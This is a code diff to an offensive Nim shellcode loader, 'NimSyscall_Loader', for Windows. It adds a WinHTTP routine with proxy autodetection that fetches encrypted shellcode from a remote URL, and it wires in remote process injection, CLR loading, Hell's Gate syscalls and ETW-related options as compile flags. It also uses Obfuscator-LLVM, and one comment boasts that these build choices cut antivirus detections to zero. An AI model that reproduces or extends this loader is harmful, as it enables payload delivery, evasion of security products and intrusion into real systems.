@@ -268,6 +268,7 @@ var
     metadata: bool = false
     antidebug: bool = false
     remoteMapSection: bool = false
+    remoteinject: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.75")
 
@@ -431,6 +432,7 @@ if args["--sleep-in-between"]:
     
 if args["--remoteinject"]:
   localinject = false
+  remoteinject = true
 
 if args["--blockDLLs"]:
     blockDLLs = true
@@ -940,13 +942,149 @@ let ShellcodeFromFileStub * = fmt"""
 
 let ShellcodeFromURLStub * = fmt"""
 
-import std/net
-import std/httpclient
-    when defined(ssl):
-        var client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
-    else:
-        var client = newHttpClient()
-    var encString = client.getContent("{shellcodeURL}")
+    #[
+        References:
+            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_winhttp.c
+            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_wininet.c
+            - https://gist.github.com/henkman/2e7a4dcf4822bc0029d7d2af731da5c5
+    ]#
+
+
+    proc httpRequestException(msg: string) =
+        raise newException(ValueError, "Error when performing HTTP request: " & $msg)
+
+    proc safeStringSlice(n: LPCWSTR, l: DWORD): LPCWSTR =
+        var
+            nim_string = $n
+            nim_int = l-1
+
+        return nim_string[0..nim_int]
+
+    proc httpGetRequest(url: string): string =
+        var
+            bits: URL_COMPONENTS
+            flags: DWORD
+            hSession, hConnect, hReq: HINTERNET
+            ieConfig: WINHTTP_CURRENT_USER_IE_PROXY_CONFIG
+            proxyInfo: WINHTTP_PROXY_INFO
+            dwSize, dwDownloaded: DWORD = 0
+            pszOutBuffer: LPSTR
+            bResults: bool
+            totalDownloaded: int
+            dataBuffer: StringStream = newStringStream("")
+
+        when defined(ssl):
+            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE or WINHTTP_FLAG_SECURE
+        else:
+            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE
+
+        when defined(verbose):
+            echo obf("+ Attempting HTTP GET request to: ") & url
+
+        hSession = WinHttpOpen(obf("PackRequest"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
+        if hSession.isNil:
+            when defined(verbose):
+                httpRequestException(obf("Creating hSession returned an error: ") & $GetLastError())
+
+        zeroMem(addr bits, sizeof(bits))
+        bits.dwStructSize = cast[DWORD](sizeof(bits))
+
+        bits.dwSchemeLength    = -1
+        bits.dwHostNameLength  = -1
+        bits.dwUrlPathLength   = -1
+        bits.dwExtraInfoLength = -1
+
+        WinHttpCrackUrl(url, 0, 0, addr bits)
+        var actual_hostname = safeStringSlice(bits.lpszHostName, bits.dwHostNameLength)
+        var actual_scheme = safeStringSlice(bits.lpszScheme, bits.dwSchemeLength)
+        when defined(verbose):
+            echo obf("* [HTTP] Scheme: "), actual_scheme
+            echo obf("* [HTTP] Hostname: "), actual_hostname
+            echo obf("* [HTTP] URL Path: "), bits.lpszUrlPath
+
+        if not hSession.isNil:
+            hConnect = WinHttpConnect(hSession, actual_hostname, bits.nPort, 0)
+
+        if not hConnect.isNil:
+            hReq = WinHttpOpenRequest(hConnect, "GET", bits.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
+
+        if WinHttpGetIEProxyConfigForCurrentUser(addr ieConfig):
+            when defined(verbose):
+                echo obf("* [PROXY] Got IE Configuration")
+                echo obf("* [PROXY] Autodetect: "), ieConfig.fAutoDetect
+                echo obf("* [PROXY] Auto URL: "), $ieConfig.lpszAutoConfigUrl
+                echo obf("* [PROXY] Proxy: "), $ieConfig.lpszProxy
+                echo obf("* [PROXY] Proxy Bypass: "), $ieConfig.lpszProxyBypass
+
+            if (not ieConfig.lpszAutoConfigUrl.isNil or ieConfig.fAutoDetect.bool):
+                var autoProxyOpts: WINHTTP_AUTOPROXY_OPTIONS
+
+                if ieConfig.fAutoDetect:
+                    when defined(verbose):
+                        echo obf("* [PROXY] IE config set to autodetect with DNS or DHCP")
+                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT
+                    autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP or WINHTTP_AUTO_DETECT_TYPE_DNS_A
+                    autoProxyOpts.lpszAutoConfigUrl = NULL
+
+                elif not ieConfig.lpszAutoConfigUrl.isNil:
+                    when defined(verbose):
+                        echo obf("* [PROXY] IE config set to autodetect with URL "), ieConfig.lpszAutoConfigUrl
+
+                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL
+                    autoProxyOpts.dwAutoDetectFlags = 0
+                    autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl
+
+                autoProxyOpts.fAutoLogonIfChallenged = TRUE;
+
+                WinHttpGetProxyForUrl(hSession, bits.lpszUrlPath, addr autoProxyOpts, addr proxyInfo)
+
+            elif not ieConfig.lpszProxy.isNil:
+                when defined(verbose):
+                    echo obf("* [PROXY] IE config set to proxy "), ieConfig.lpszProxy, obf(" with bypass "), ieConfig.lpszProxyBypass 
+
+                proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY
+                proxyInfo.lpszProxy = ieConfig.lpszProxy
+                proxyInfo.lpszProxyBypass = ieConfig.lpszProxyBypass
+
+                ieConfig.lpszProxy = NULL
+                ieConfig.lpszProxyBypass = NULL
+
+        WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, addr proxyInfo, cast[DWORD](sizeof(WINHTTP_PROXY_INFO)))
+
+        if not hReq.isNil:
+            bResults = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
+
+        if bResults:
+            bResults = WinHttpReceiveResponse(hReq, NULL)
+
+        if bResults:
+            while true:
+                if not WinHttpQueryDataAvailable(hReq, addr dwSize).bool:
+                    httpRequestException("Error in WinHttpQueryDataAvalable: " & $GetLastError())
+
+                if dwSize == 0:
+                    break
+
+                pszOutBuffer = newString(dwSize+1)
+                zeroMem(pszOutBuffer, dwSize+1)
+
+                if not WinHttpReadData(hReq, addr pszOutBuffer[0], dwSize, addr dwDownloaded).bool:
+                    httpRequestException("Error receiving data: " & $GetLastError())
+
+                dataBuffer.writeData(addr pszOutBuffer[0], dwDownloaded)
+                totalDownloaded += dwDownloaded
+
+            when defined(verbose):
+                echo obf("+ Total data received: "), totalDownloaded
+
+            WinHttpCloseHandle(hReq)
+            WinHttpCloseHandle(hConnect)
+            WinHttpCloseHandle(hSession)
+
+            dataBuffer.setPosition(0)
+            return dataBuffer.readAll()
+
+    var encString = httpGetRequest(obf("{shellcodeURL}"))
 
 """
 
@@ -957,6 +1095,10 @@ let ShellcodeDefaultStub * = fmt"""
 
 let Cryptstub1 = """
 import winim/lean
+import strformat
+from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
+import strutils
+import ptr_math
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
@@ -965,32 +1107,37 @@ import winim/lean
 #import winim/utils
 #from winim import winstr,winimbase,windef
 
-# when defined C#
-import winim/clr
-from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
-from os import paramCount,paramStr
+when defined(csharp):
+    import winim/clr
+    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
+    from os import paramCount,paramStr
 
-# when defined Sleep
-import random
-import times
+when defined(sleep):
+    import random
+    import times
 
-# when defined Hellsgate
-from os import paramStr
-{.passC:"-masm=intel".}
-from winlean import getCurrentProcess
+when defined http:
+    import winim/inc/winhttp
+    import streams
+when defined ssl:
+    import winim/inc/winhttp
+    import streams
 
-# add When defined remoteinject
-from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA
-# when defined remoteinject or COMVARETW
-import osproc,os
-from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
-from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+when defined(Hellsgate):
+    from os import paramStr
+    {.passC:"-masm=intel".}
+    from winlean import getCurrentProcess
 
+when defined(remoteinject):
+    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+    import osproc,os
 
-import strformat
-from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
-import strutils
-import ptr_math
+when defined(COMVARETW):
+    import osproc,os
+    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+
 when not defined(proxy):
     import strenc
 when defined(Fluctuate):
@@ -1846,7 +1993,7 @@ if(dllProxy):
 
 
 # --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
-# This is only for the best size: -d:danger -d:strip --opt:size --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
+# This is only for the best size: -d:danger -d:strip --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
 # --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality
 
 var basicCompileFlags: string = ""
@@ -1865,7 +2012,7 @@ if (llvm):
             let ochars = {'A'..'Z','0'..'9'}
             var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
             #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
-            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
         else:
             echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
             quit()
@@ -1875,18 +2022,18 @@ if (llvm):
             let ochars = {'A'..'Z','0'..'9'}
             var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
             #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
-            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
         else:
             echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
             quit()
 elif system.hostOS == "windows":
     # there's a bug in my modified denim, which makes "--" out of "-d" for the first argument when using multiple arguments, so only one can be accepted at the moment
     if (denim):
-        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
+        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
     else:
-        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
 if (dllProxy or dllClone):
     basicCompileFlags.add("--mm:orc --threads:on ")
@@ -1910,6 +2057,18 @@ if(wait):
 if(blockDLLs):
     basicCompileFlags.add("-d:blockDLLs ")
 
+if(csharp):
+    basicCompileFlags.add("-d:csharp ")
+
+if(gosleep):
+    basicCompileFlags.add("-d:sleep ")
+
+if(remoteinject):
+    basicCompileFlags.add("-d:remoteinject ")
+
+if(COMVARETW):
+    basicCompileFlags.add("-d:COMVARETW ")
+
 if (noNimMain):
     when system.hostOS == "windows":
         basicCompileFlags.add(fmt"--passl:{packerPath}\\dllProxy\nonimmain.def ")
@@ -1917,11 +2076,13 @@ if (noNimMain):
         basicCompileFlags.add(fmt"--passl:{packerPath}/dllProxy/nonimmain.def ")
 
 if (retrieveFromURL):
-    if(shellcodeURL.contains("https")):
+    if(shellcodeURL.contains("https") or shellcodeURL.contains("HTTPS")):
         basicCompileFlags.add("-d:ssl ")
     elif(not shellcodeURL.contains("http")):
         echo "[!] URL must contain http:// or https://"
         quit()
+    else:
+        basicCompileFlags.add("-d:http ")
 
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
